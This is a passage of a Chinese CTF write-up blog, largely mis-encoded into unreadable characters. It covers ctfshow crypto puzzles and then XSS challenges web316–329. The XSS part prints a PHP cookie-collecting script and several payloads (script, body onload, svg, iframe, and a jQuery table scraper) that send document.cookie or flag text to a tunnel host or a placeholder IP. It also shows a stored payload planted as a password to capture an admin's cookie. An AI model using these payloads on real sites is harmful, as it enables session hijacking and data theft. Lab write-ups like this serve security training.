Ook!<br>Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook!<br>Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook! Ook. Ook? Ook. </p></blockquote><p>Áúã‰∏çÊáÇÂïäÔºüÂéüÊù•ÊòØ<strong>ookÂä†ÂØÜ</strong></p><p>ËøôÊòØ‰∏ÄÁßçÂæà‰∏çÂ∏∏ËßÅÁöÑÁºñÁ†ÅOokÔºÅ</p><p>‰ªÄ‰πàÈ¨ºÔºüÂ∞±ÊòØ‰∏ÄÁßçÁºñÁ†ÅËÄåÂ∑≤<br>ÈÄöËøáËøô‰∏™Âú∞ÂùÄÊàë‰ª¨ÂèØ‰ª•Â∞ÜÂÖ∂Ëß£Á†Å<br>Âú∞ÂùÄÔºö<a href="https://tool.bugku.com/brainfuck/">OokÁºñÁ†Å</a><br>ÁÇπÂáªOokÔºÅto testÂç≥ÂèØËß£ÂØÜ</p><h2 id="brainfuckËß£ÂØÜ"><a href="#brainfuckËß£ÂØÜ" class="headerlink" title="brainfuckËß£ÂØÜ"></a>brainfuckËß£ÂØÜ</h2><blockquote><p>+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;‚Äì -&lt;]&gt;- -.+++ +++.&lt;<br>++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++++ +++[- &gt;‚Äî- ‚Äî-&lt; ]&gt;‚Äì. .‚Äì.- -.-.- ‚Äì.-.<br>+++++ +..‚Äì -..&lt;+ +++++ +[-&gt;+ +++++ +&lt;]&gt;+ +.&lt;++ ++++[ -&gt;‚Äî ‚Äî&lt;] &gt;‚Äî-<br>‚Äî‚Äì .‚Äî- -.&lt;++ ++++[ -&gt;+++ +++&lt;] &gt;++++ +++++ +++.&lt; +++++ ++[-&gt; ‚Äî‚Äì<br>‚Äì&lt;]&gt; .++.- ‚Äî-. &lt;++++ +++[- &gt;++++ +++&lt;] &gt;+++. ‚Äì.&lt;+ +++++ [-&gt;‚Äì ‚Äî-&lt;<br>]&gt;‚Äî ‚Äî‚Äì ‚Äî.+ .&lt;+++ +++[- &gt;++++ ++&lt;]&gt; +++++ +++++ ++.&lt;+ +++++ [-&gt;‚Äì<br>‚Äî-&lt; ]&gt;‚Äî ‚Äî‚Äì ‚Äî.- .++++ .&lt;+++ +++[- &gt;++++ ++&lt;]&gt; +++++ +++.&lt; +++++<br>+[-&gt;- ‚Äî‚Äì &lt;]&gt;‚Äì ‚Äî‚Äì ‚Äî.- ‚Äî‚Äì .++++ +++++ .‚Äî- ‚Äî-. &lt;++++ ++[-&gt;<br>+++++ +&lt;]&gt;+ +++++ +++++ +.&lt;++ +++[- &gt;++++ +&lt;]&gt;+ ++.&lt;</p></blockquote><p><a href="https://tool.bugku.com/brainfuck/">brainfuckËß£ÂØÜ</a><br><img src="https://img-blog.csdnimg.cn/d37a3ee90d6c4dee8b78f144403eac70.png" alt="8"></p><h2 id="crypto9"><a href="#crypto9" class="headerlink" title="crypto9"></a>crypto9</h2><p>ÂæóÂà∞‰∏Ä‰∏™ÂéãÁº©ÂåÖÔºåÊö¥ÂäõÁ†¥Ëß£ÂæóÂà∞ÂØÜÁ†Å‰∏∫<strong>4132</strong><br>‰∏ãÈù¢Ê≤°ÊÄùË∑Ø‰∫ÜÔºåÁúã‰∫ÜÂ§ß‰Ω¨ÁöÑwpÂéüÊù•ÊòØ<a href="https://blog.csdn.net/douqingl/article/details/50256931">Serpent </a><br><a href="http://serpent.online-domain-tools.com/">Ëß£ÂØÜÁΩëÂùÄ</a><br><img src="https://img-blog.csdnimg.cn/d78a4f4147ec43349d6241a756c8d818.png" alt="9"></p><h2 id="crypto10"><a href="#crypto10" class="headerlink" title="crypto10"></a>crypto10</h2><blockquote><p>&#x3D;E7&#x3D;94&#x3D;A8&#x3D;E4&#x3D;BD&#x3D;A0&#x3D;E9&#x3D;82&#x3D;A3&#x3D;E7&#x3D;81&#x3D;AB&#x3D;E7&#x3D;83&#x3D;AD&#x3D;E7&#x3D;9A&#x3D;84&#x3D;E5&#x3D;98&#x3D;B4&#x3D;E5&#x3D;94&#x3D;87&#x3D;E8&#x3D;AE&#x3D;A9&#x3D;E6&#x3D;88&#x3D;91&#x3D;E5&#x3D;9C&#x3D;A8&#x3D;E5&#x3D;8D&#x3D;88&#x3D;E5&#x3D;A4&#x3D;9C&#x3D;E9&#x3D;87&#x3D;8C&#x3D;E6&#x3D;97&#x3D;A0&#x3D;E5&#x3D;B0&#x3D;BD&#x3D;E7&#x3D;9A&#x3D;84&#x3D;E9&#x3D;94&#x3D;80&#x3D;E9&#x3D;AD&#x3D;82</p></blockquote><p>Áî®**[ÈöèÊ≥¢ÈÄêÊµÅ]CTFÁºñÁ†ÅÂ∑•ÂÖ∑<strong>Ëß£ÂØÜÂæóÂà∞<br><img src="https://img-blog.csdnimg.cn/d702c6d9ecca46399271a62a0207cb31.png" alt="10"><br>flag‰∏∫</strong>flag{Áî®‰Ω†ÈÇ£ÁÅ´ÁÉ≠ÁöÑÂò¥ÂîáËÆ©ÊàëÂú®ÂçàÂ§úÈáåÊó†Â∞ΩÁöÑÈîÄÈ≠Ç}</p><h2 id="crypto11"><a href="#crypto11" class="headerlink" title="crypto11"></a>crypto11</h2><p>‰∏ÄÁúãÂ∞±ÊòØMD5Âä†ÂØÜ<a href="https://www.somd5.com/">Ëß£ÂØÜ</a></p><h2 id="ÂüÉÁâπÂ∑¥‰ªÄÁ†Å"><a href="#ÂüÉÁâπÂ∑¥‰ªÄÁ†Å" class="headerlink" title="ÂüÉÁâπÂ∑¥‰ªÄÁ†Å"></a>ÂüÉÁâπÂ∑¥‰ªÄÁ†Å</h2><blockquote><p>ÂØÜÊñáÔºöuozt{Zgyzhv_xlwv_uiln_xguhsld}</p></blockquote><blockquote><p>ÂüÉÁâπÂ∑¥‰ªÄÁ†ÅÔºàAtbash CipherÔºâÂÖ∂ÂÆûÂèØ‰ª•ËßÜ‰∏∫‰∏ãÈù¢Ë¶Å‰ªãÁªçÁöÑÁÆÄÂçïÊõøÊç¢ÂØÜÁ†ÅÁöÑÁâπ‰æãÔºåÂÖ∂ÂéüÁêÜ‰∏∫ÔºöÂÆÉ‰ΩøÁî®Â≠óÊØçË°®‰∏≠ÁöÑÊúÄÂêé‰∏Ä‰∏™Â≠óÊØç‰ª£Ë°®Á¨¨‰∏Ä‰∏™Â≠óÊØçÔºåÂÄíÊï∞Á¨¨‰∫å‰∏™Â≠óÊØç‰ª£Ë°®Á¨¨‰∫å‰∏™Â≠óÊØç„ÄÇÂú®ÁΩóÈ©¨Â≠óÊØçË°®‰∏≠ÔºåÂÆÉÊòØËøôÊ†∑Âá∫Áé∞ÁöÑÔºö<br> ÊòéÊñáÔºöA B C D E F G H I J K L M N O P Q R S T U V W X Y Z<br> ÂØÜÊñáÔºöZ Y X W V U T S R Q P O N M L K J I H G F E D C B A</p></blockquote><p>(ÂüÉÁâπÂ∑¥‰ªÄÁ†ÅËß£ÂØÜ)[<a href="http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/]">http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/]</a></p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-xss</title>
      <link href="/2023/02/26/ctfshow-xss/"/>
      <url>/2023/02/26/ctfshow-xss/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p><img src="https://img-blog.csdnimg.cn/bd7d0276dcd141c4ae556dde560fcab9.png" alt="1"></p><blockquote><p>ÂÖ≥ÈîÆËØçÔºö</p><p> Ë∑®Á´ô<br> ËÑöÊú¨ÔºàJavaScript„ÄÅJava„ÄÅ VBScript„ÄÅActiveX„ÄÅ Flash ÊàñËÄÖ HTMLÔºâ<br> Ê≥®ÂÖ•<br> ÊâßË°å</p></blockquote><h1 id="‰ªãÁªç"><a href="#‰ªãÁªç" class="headerlink" title="‰ªãÁªç"></a>‰ªãÁªç</h1><h2 id="1-‰ªÄ‰πàÊòØ-XSS-ÊºèÊ¥û"><a href="#1-‰ªÄ‰πàÊòØ-XSS-ÊºèÊ¥û" class="headerlink" title="1. ‰ªÄ‰πàÊòØ XSS ÊºèÊ¥û?"></a>1. ‰ªÄ‰πàÊòØ XSS ÊºèÊ¥û?</h2><p>XSS ÊîªÂáªÔºöË∑®Á´ôËÑöÊú¨ÊîªÂáª(Cross Site Scripting)Ôºå‰∏∫‰∏çÂíå ÂâçÁ´ØÂ±ÇÂè†Ê†∑ÂºèË°®(Cascading Style Sheets)CSS Ê∑∑Ê∑ÜÔºåÊïÖÂ∞ÜË∑®Á´ôËÑöÊú¨ÊîªÂáªÁº©ÂÜô‰∏∫ XSS„ÄÇ</p><p>XSS(Ë∑®Á´ôËÑöÊú¨ÊîªÂáª)ÊòØÊåáÊÅ∂ÊÑèÊîªÂáªËÄÖÂæÄ Web È°µÈù¢ÈáåÊèíÂÖ•ÊÅ∂ÊÑè Script ‰ª£Á†ÅÔºåÂΩìÁî®Êà∑ÊµèËßàËØ•È°µÊó∂ÔºåÂµåÂÖ•ÂÖ∂‰∏≠ Web ÈáåÈù¢ÁöÑ Script ‰ª£Á†Å‰ºöË¢´ÊâßË°åÔºå‰ªéËÄåËææÂà∞ÊÅ∂ÊÑèÊîªÂáªÁî®Êà∑ÁöÑÁõÆÁöÑ„ÄÇÁ±ª‰ºº‰∫é sql Ê≥®ÂÖ•„ÄÇÊòØÁõÆÂâçÊúÄÊôÆÈÅçÁöÑ Web Â∫îÁî®ÂÆâÂÖ®ÊºèÊ¥ûÔºå‰πüÊòØ Web ÊîªÂáª‰∏≠ÊúÄÂ∏∏ËßÅÁöÑÊîªÂáªÊñπÂºè‰πã‰∏Ä„ÄÇ</p><p>XSSÔºà Ë∑®Á´ôËÑöÊú¨ÊîªÂáªÔºâÊîªÂáªÈÄöÂ∏∏ÊåáÁöÑÊòØÈÄöËøáÂà©Áî®ÁΩëÈ°µÂºÄÂèëÊó∂Áïô‰∏ãÁöÑÊºèÊ¥ûÔºåÈÄöËøáÂ∑ßÂ¶ôÁöÑÊñπÊ≥ïÊ≥®ÂÖ•ÊÅ∂ÊÑèÊåá‰ª§‰ª£Á†ÅÂà∞ÁΩëÈ°µÔºå‰ΩøÁî®Êà∑Âä†ËΩΩÂπ∂ÊâßË°åÊîªÂáªËÄÖÊÅ∂ÊÑèÂà∂ÈÄ†ÁöÑÁΩëÈ°µÁ®ãÂ∫è„ÄÇËøô‰∫õÊÅ∂ÊÑèÁΩëÈ°µÁ®ãÂ∫èÈÄöÂ∏∏ÊòØ JavaScriptÔºå‰ΩÜÂÆûÈôÖ‰∏ä‰πüÂèØ‰ª•ÂåÖÊã¨ Java„ÄÅ VBScript„ÄÅActiveX„ÄÅ Flash ÊàñËÄÖÁîöËá≥ÊòØÊôÆÈÄöÁöÑ HTML„ÄÇÊîªÂáªÊàêÂäüÂêéÔºåÊîªÂáªËÄÖÂèØËÉΩÂæóÂà∞ÂåÖÊã¨‰ΩÜ‰∏çÈôê‰∫éÊõ¥È´òÁöÑÊùÉÈôêÔºàÂ¶ÇÊâßË°å‰∏Ä‰∫õÊìç‰ΩúÔºâ„ÄÅÁßÅÂØÜÁΩëÈ°µÂÜÖÂÆπ„ÄÅ‰ºöËØùÂíå cookie Á≠âÂêÑÁßçÂÜÖÂÆπ„ÄÇ</p><h2 id="2-XSS-ÊºèÊ¥ûÊîªÂáªÂéüÁêÜÂèäÊîªÂáªÊâãÊÆµ"><a href="#2-XSS-ÊºèÊ¥ûÊîªÂáªÂéüÁêÜÂèäÊîªÂáªÊâãÊÆµ" class="headerlink" title="2. XSS ÊºèÊ¥ûÊîªÂáªÂéüÁêÜÂèäÊîªÂáªÊâãÊÆµ"></a>2. XSS ÊºèÊ¥ûÊîªÂáªÂéüÁêÜÂèäÊîªÂáªÊâãÊÆµ</h2><p>HTML ÊòØ‰∏ÄÁßçË∂ÖÊñáÊú¨Ê†áËÆ∞ËØ≠Ë®ÄÔºåÈÄöËøáÂ∞Ü‰∏Ä‰∫õÂ≠óÁ¨¶ÁâπÊÆäÂú∞ÂØπÂæÖÊù•Âå∫Âà´ÊñáÊú¨ÂíåÊ†áËÆ∞Ôºå‰æãÂ¶ÇÔºåÂ∞è‰∫éÁ¨¶Âè∑Ôºà&lt;ÔºâË¢´Áúã‰ΩúÊòØ HTML Ê†áÁ≠æÁöÑÂºÄÂßãÔºå‰πãÈó¥ÁöÑÂ≠óÁ¨¶ÊòØÈ°µÈù¢ÁöÑÊ†áÈ¢òÁ≠âÁ≠â„ÄÇ</p><p>ÂΩìÂä®ÊÄÅÈ°µÈù¢‰∏≠ÊèíÂÖ•ÁöÑÂÜÖÂÆπÂê´ÊúâËøô‰∫õÁâπÊÆäÂ≠óÁ¨¶ÔºàÂ¶Ç&lt;ÔºâÊó∂ÔºåÁî®Êà∑ÊµèËßàÂô®‰ºöÂ∞ÜÂÖ∂ËØØËÆ§‰∏∫ÊòØÊèíÂÖ•‰∫Ü HTML Ê†áÁ≠æÔºåÂΩìËøô‰∫õ HTML Ê†áÁ≠æÂºïÂÖ•‰∫Ü‰∏ÄÊÆµ JavaScript ËÑöÊú¨Êó∂ÔºåËøô‰∫õËÑöÊú¨Á®ãÂ∫èÂ∞±Â∞Ü‰ºöÂú®Áî®Êà∑ÊµèËßàÂô®‰∏≠ÊâßË°å„ÄÇÊâÄ‰ª•ÔºåÂΩìËøô‰∫õÁâπÊÆäÂ≠óÁ¨¶‰∏çËÉΩË¢´Âä®ÊÄÅÈ°µÈù¢Ê£ÄÊü•ÊàñÊ£ÄÊü•Âá∫Áé∞Â§±ËØØÊó∂ÔºåÂ∞±Â∞Ü‰ºö‰∫ßÁîü XSS ÊºèÊ¥û„ÄÇ</p><blockquote><p>Â∏∏Áî®ÁöÑ XSS ÊîªÂáªÊâãÊÆµÂíåÁõÆÁöÑÊúâÔºö</p><p>1„ÄÅÁõóÁî® cookieÔºåËé∑ÂèñÊïèÊÑü‰ø°ÊÅØ„ÄÇ</p><p>2„ÄÅÂà©Áî®Ê§çÂÖ• FlashÔºåÈÄöËøá crossdomain ÊùÉÈôêËÆæÁΩÆËøõ‰∏ÄÊ≠•Ëé∑ÂèñÊõ¥È´òÊùÉÈôêÔºõÊàñËÄÖÂà©Áî® Java Á≠âÂæóÂà∞Á±ª‰ººÁöÑÊìç‰Ωú„ÄÇ</p><p>3„ÄÅÂà©Áî® iframe„ÄÅframe„ÄÅXMLHttpRequest Êàñ‰∏äËø∞ Flash<br>Á≠âÊñπÂºèÔºå‰ª•ÔºàË¢´ÊîªÂáªÔºâÁî®Êà∑ÁöÑË∫´‰ªΩÊâßË°å‰∏Ä‰∫õÁÆ°ÁêÜÂä®‰ΩúÔºåÊàñÊâßË°å‰∏Ä‰∫õ‰∏ÄËà¨ÁöÑÂ¶ÇÂèëÂæÆÂçö„ÄÅÂä†Â•ΩÂèã„ÄÅÂèëÁßÅ‰ø°Á≠âÊìç‰Ωú„ÄÇ</p><p>4„ÄÅÂà©Áî®ÂèØË¢´ÊîªÂáªÁöÑÂüüÂèóÂà∞ÂÖ∂‰ªñÂüü‰ø°‰ªªÁöÑÁâπÁÇπÔºå‰ª•Âèó‰ø°‰ªªÊù•Ê∫êÁöÑË∫´‰ªΩËØ∑Ê±Ç‰∏Ä‰∫õÂπ≥Êó∂‰∏çÂÖÅËÆ∏ÁöÑÊìç‰ΩúÔºåÂ¶ÇËøõË°å‰∏çÂΩìÁöÑÊäïÁ•®Ê¥ªÂä®„ÄÇ</p><p>5„ÄÅÂú®ËÆøÈóÆÈáèÊûÅÂ§ßÁöÑ‰∏Ä‰∫õÈ°µÈù¢‰∏äÁöÑ XSS ÂèØ‰ª•ÊîªÂáª‰∏Ä‰∫õÂ∞èÂûãÁΩëÁ´ôÔºåÂÆûÁé∞ DDoS ÊîªÂáªÁöÑÊïàÊûú„ÄÇ</p></blockquote><h2 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h2><p>‰ΩøÁî®<strong>cpolar</strong>ËøõË°åÂÜÖÁΩëÁ©øÈÄè„ÄÇ<br>Êú¨Âú∞ÂÜôÂÖ•xss.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$flag</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.txt'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'w+'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Ëøô‰∏ÄÈ¢òËæìÂÖ• <code>&lt;script&gt;windows.location.href=&#39;http://1f72xxx3.r3.cpolar.top/xss.php?c=&#39;+document.cookie&lt;/script&gt;</code>‰∏çÂä†window‰πüÂèØ‰ª•„ÄÇ<br>Êú¨Âú∞ÂæóÂà∞flag„ÄÇ<br>ËøòÊúâ<code>&lt;script&gt;window.open(&#39;http://ip/&#39;+document.cookie)&lt;/script&gt;</code><br><code>&lt;svg onload=&quot;window.open(&#39;http://xxx/&#39;+document.cookie)&quot;&gt;</code><br><code>&lt;iframe onload=&quot;window.open(&#39;http://1xxx/&#39;+document.cookie)&quot;&gt;&lt;/iframe&gt;</code></p><blockquote><p>Window open() ÊñπÊ≥ï<br>open() ÊñπÊ≥ïÁî®‰∫éÊâìÂºÄ‰∏Ä‰∏™Êñ∞ÁöÑÊµèËßàÂô®Á™óÂè£ÊàñÊü•Êâæ‰∏Ä‰∏™Â∑≤ÂëΩÂêçÁöÑÁ™óÂè£„ÄÇ </p></blockquote><p><img src="https://img-blog.csdnimg.cn/74a587fe2e1a4b1091feeeda46152723.png" alt="1"></p><h2 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h2><p>ËøõË°å‰∫ÜËøáÊª§Ôºå<code>&lt;script&gt;</code>ËøõË°å‰∫ÜËøáÊª§„ÄÇÈÇ£Â∞±‰ΩøÁî®<code>&lt;body&gt;</code><br><code>&lt;body onload=&quot;window.location.href=&#39;http://1f72eccc63.r3.cpolar.top/xss.php?c=&#39;+document.cookie&quot;&gt;</code><br>Êú¨Âú∞ÂæóÂà∞flag„ÄÇ</p><h2 id="web318"><a href="#web318" class="headerlink" title="web318"></a>web318</h2><p>ËøáÊª§img</p><h2 id="web320-322"><a href="#web320-322" class="headerlink" title="web320-322"></a>web320-322</h2><p>ËøáÊª§‰∫Ü<strong>Á©∫Ê†º</strong>ÈááÁî®&#x2F;**&#x2F;</p><h2 id="web-323-326"><a href="#web-323-326" class="headerlink" title="web 323-326"></a>web 323-326</h2><p>ËøáÊª§‰∫ÜxssÔºåÊääÊú¨Âú∞ÁöÑÊé•Êî∂Êñá‰ª∂Ôºà<strong>xss.php</strong>ÔºâÊîπ‰∏∫<strong>x.php</strong></p><p>‰ª•‰∏äÈÉΩÊòØÂèçÂ∞ÑÂûãÔºåÊé•‰∏ãÊù•ÊòØ<strong>Â≠òÂÇ®Âûã</strong>„ÄÇ</p><h2 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h2><p><code>&lt;body onload=&quot;window.location.href=&#39;http://1f72ffec63.r3.cpolar.top/xss.php?c=&#39;+document.cookie&quot;&gt;</code><br>ÈúÄÊ≥®ÊÑèÊî∂‰ª∂‰∫∫ÂøÖÈ°ªÊòØadmin„ÄÇ</p><h2 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h2><p>Áî®Êà∑ÁÆ°ÁêÜÂ§ÑÊòæÁ§∫Êàë‰ª¨‰∏çÊòØadmin<br><img src="https://img-blog.csdnimg.cn/df99dac33016489fab135c338cb89030.png" alt="1"><br>ÊâÄ‰ª•Êàë‰ª¨Ê≥®ÂÜå‰∏Ä‰∏™Áî®Êà∑ËøõË°åxssÔºåÂõ†‰∏∫Âú®Ê≥®ÂÜåÁî®Êà∑Êó∂‰ºöÊääË¥¶Êà∑ÂØÜÁ†ÅÂ≠òÂÇ®Ëµ∑Êù•ÔºåÂΩìÁÆ°ÁêÜÂëòÊâìÂºÄÈ°µÈù¢Êó∂‰ºöËøõË°åÊîªÂáªÂπ∂‰∏îÂæóÂà∞cookie„ÄÇ</p><p><img src="https://img-blog.csdnimg.cn/e20c9afd03ac4145ae80e7d5fd32c59d.png" alt="2"><br>ÂØÜÁ†Å‰∏∫Ôºö<code>&lt;script&gt;document.location.href=&#39;http://1f72ec63.r3.cpolar.top/x.php?c=&#39;+document.cookie&lt;/script&gt;</code>Ëøá‰∏ÄÊÆµÊó∂Èó¥ÂêéÊú¨Âú∞Êñá‰ª∂‰ºöÂæóÂà∞cookie<br><img src="https://img-blog.csdnimg.cn/b1fc82f156f840fdb7f7a2c13fe9ece0.png" alt="3"><br>ËøõÂÖ•Áî®Êà∑ÁÆ°ÁêÜÈ°µÈù¢Ê≤°ÊâæÂà∞flag„ÄÇÁî®burpÊäìÂåÖËØïËØï„ÄÇ<br><img src="https://img-blog.csdnimg.cn/66ded499169947dcb2ea50d53888a948.png" alt="5"></p><h2 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h2><p>‰∏äÈ¢òÁöÑÊÄùË∑Ø‰∏çËÉΩÁî®‰∫ÜÔºåÂèëÁé∞adminÁöÑcookie‰ºöÊîπÂèòÔºå‰ΩøÁî®ÂêéÂ∞±‰∏çËÉΩÁî®‰∫Ü„ÄÇ<br>Áúã‰∫ÜÂ∏àÂÇÖ‰ª¨ÊñáÁ´†ÔºåÂÄüÈâ¥‰∏Ä‰∏ãÔºö</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.laytable-cell-1-0-1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">each</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">index<span class="token punctuation">,</span>value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>value<span class="token punctuation">.</span>innerText<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'ctfshow&#123;'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">'http://1f72ec63.r3.cpolar.top/x.php?c='</span><span class="token operator">+</span>value<span class="token punctuation">.</span>innerText<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token comment">/*ËØ• JavaScript ‰ª£Á†Å‰∏≠ÁöÑ‰∏ªË¶ÅÂäüËÉΩÊòØÂú®ÂΩìÂâçÁΩëÈ°µ‰∏≠Êü•ÊâæÊâÄÊúâÁ±ªÂêç‰∏∫‚Äúlaytable-cell-1-0-1‚ÄùÁöÑÂÖÉÁ¥†„ÄÇ‰ΩøÁî® jQuery Â∫ì‰∏≠ÁöÑ each() ÂáΩÊï∞Ëø≠‰ª£Ëøô‰∫õÂÖÉÁ¥†ÔºåÂØπÊØè‰∏™ÂÖÉÁ¥†ÊâßË°å‰ª•‰∏ãÊìç‰ΩúÔºö‰ΩøÁî® indexOf() ÂáΩÊï∞Ê£ÄÊü•ËØ•ÂÖÉÁ¥†‰∏≠ÁöÑÊñáÊú¨ÊòØÂê¶ÂåÖÂê´‚Äúctfshow&#123;‚ÄùÂ≠óÁ¨¶‰∏≤ÔºåÂ¶ÇÊûúÂåÖÂê´ÂàôÊâßË°å‰∏ã‰∏ÄÊ≠•ÔºåÂê¶Âàô‰∏çÂÅö‰ªª‰ΩïÊìç‰Ωú„ÄÇÊûÑÈÄ†‰∏Ä‰∏™ URLÔºåÂÖ∂‰∏≠‚Äúhttp://ip/x.php?cookie=‚ÄùÊòØÁõÆÊ†áÁΩëÁ´ôÁöÑ URLÔºåËÄå value.innerText ÊòØÂåÖÂê´‚Äúctfshow&#123;‚ÄùÂ≠óÁ¨¶‰∏≤ÁöÑÂÖÉÁ¥†ÁöÑÊñáÊú¨ÂÜÖÂÆπÔºåÂ∞ÜËØ•ÊñáÊú¨‰Ωú‰∏∫ÂèÇÊï∞Ê∑ªÂä†Âà∞ URL Êú´Â∞æ„ÄÇ‰ΩøÁî® location.href Ë∑≥ËΩ¨Âà∞Êñ∞ÁöÑ URL È°µÈù¢„ÄÇ"laytable-cell-1-0-1" ÊòØ‰∏Ä‰∏™ HTML ÂÖÉÁ¥†ÁöÑÁ±ªÂêçÔºàclass nameÔºâÔºåÁî®‰∫éÊ†áËØÜËØ•ÂÖÉÁ¥†Â±û‰∫é‰∏Ä‰∏™Ë°®Ê†ºÔºàtableÔºâ‰∏≠ÁöÑ‰∏Ä‰∏™ÂçïÂÖÉÊ†ºÔºàcellÔºâ„ÄÇÈÄöÂ∏∏ÊÉÖÂÜµ‰∏ãÔºå‰∏Ä‰∏™Ë°®Ê†º‰∏≠ÁöÑÂçïÂÖÉÊ†ºÈÉΩÂÖ∑ÊúâÁ±ª‰ººÁöÑÁ±ªÂêçÔºå‰æãÂ¶Ç‚Äúlaytable-cell-1-0-2‚Äù„ÄÅ‚Äúlaytable-cell-1-1-0‚ÄùÁ≠âÁ≠âÔºåÂÖ∂‰∏≠ÁöÑÊï∞Â≠óË°®Á§∫ÂçïÂÖÉÊ†ºÂú®Ë°®Ê†º‰∏≠ÁöÑË°åÂàó‰ΩçÁΩÆ„ÄÇËØ•Á±ªÂêçÂèØËÉΩÊòØÁî±Êüê‰∏™ÂâçÁ´ØÊ°ÜÊû∂ÊàñÂ∫ìËá™Âä®ÁîüÊàêÁöÑÔºåÁî®‰∫éÂØπË°®Ê†ºËøõË°åÊ†∑ÂºèËÆæÁΩÆÊàñ JavaScript Êìç‰Ωú„ÄÇÂú®ÁªôÂÆöÁöÑ JavaScript ‰ª£Á†Å‰∏≠ÔºåËØ•Á±ªÂêçË¢´Áî®‰∫éÊü•ÊâæÂåÖÂê´ÁâπÂÆöÂ≠óÁ¨¶‰∏≤ÁöÑÂçïÂÖÉÊ†ºÂπ∂ÊâßË°åÁõ∏ÂÖ≥Êìç‰Ωú„ÄÇ*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>ËøôÊòØ‰∏ÄÊÆµ JavaScript ‰ª£Á†ÅÔºåÂÖ∂‰ΩúÁî®ÊòØÂú®ÂΩìÂâçÁΩëÈ°µ‰∏≠ÂØªÊâæÊâÄÊúâÁ±ªÂêç‰∏∫‚Äúlaytable-cell-1-0-1‚ÄùÁöÑÂÖÉÁ¥†ÔºåÂ¶ÇÊûúËøô‰∫õÂÖÉÁ¥†‰∏≠ÁöÑÊñáÊú¨ÂåÖÂê´‚Äúctfshow{‚ÄùÔºåÈÇ£‰πàÂ∞ÜË∑≥ËΩ¨Âà∞‚Äú<a href="http://ip/x.php?cookie=%E2%80%9D+value.innerText">http://ip/x.php?cookie=‚Äù+value.innerText</a> ÁöÑÈ°µÈù¢ÔºåÂÖ∂‰∏≠ value.innerText 